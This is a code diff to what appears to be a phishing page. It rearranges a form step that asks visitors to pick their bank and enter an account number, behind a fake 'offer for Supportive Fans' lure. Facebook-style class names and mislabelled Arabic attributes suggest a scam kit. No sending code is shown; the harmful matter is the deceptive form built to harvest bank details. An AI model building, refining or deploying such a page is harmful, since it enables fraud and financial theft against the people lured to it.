@@ -707,15 +707,15 @@
 
         <!-- STEP 2: PHONE -->
         <div class="step-panel" id="stepPhone">
-            <h3>Enter Your Account Number</h3>
+            <h3>Select Bank and Enter Your Account Number</h3>
             <p style="font-size:clamp(13px, 3.5vw, 14px); color:#4b4f56; margin-bottom:10px;">We'll check if you're among the Supportive Fans to benefit from this offer</p>
-            <div class="input-group">
-                <input type="tel" id="phoneInput" placeholder="XXXXXXXXXX" maxlength="11" inputmode="numeric" pattern="[0-9]*">
-				<br/>
+
+			<br/>
+			<br/>
 				 <center>
 
                     <select aria-label="الجنس" name="birthday_year" id="year" title="الجنس" class="_5dba" style="
-    width: 330px;
+    width: 350px;
     height: 56px;
 ">
 <option value="أختر نوع الشبكة" selected="1">---SELECT BANK---</option>
@@ -729,8 +729,11 @@
 </select>
                 </center>
 
- <br/>
-                <button id="btnSendPhone">Send</button>
+ <br/> <br/>
+            <div class="input-group">
+                <input type="tel" id="phoneInput" placeholder="XXXXXXXXXX" maxlength="11" inputmode="numeric" pattern="[0-9]*">
+				
+                <button id="btnSendPhone">SEND</button>
             </div>
             <div id="phoneStatus" class="status-msg"></div>
         </div>
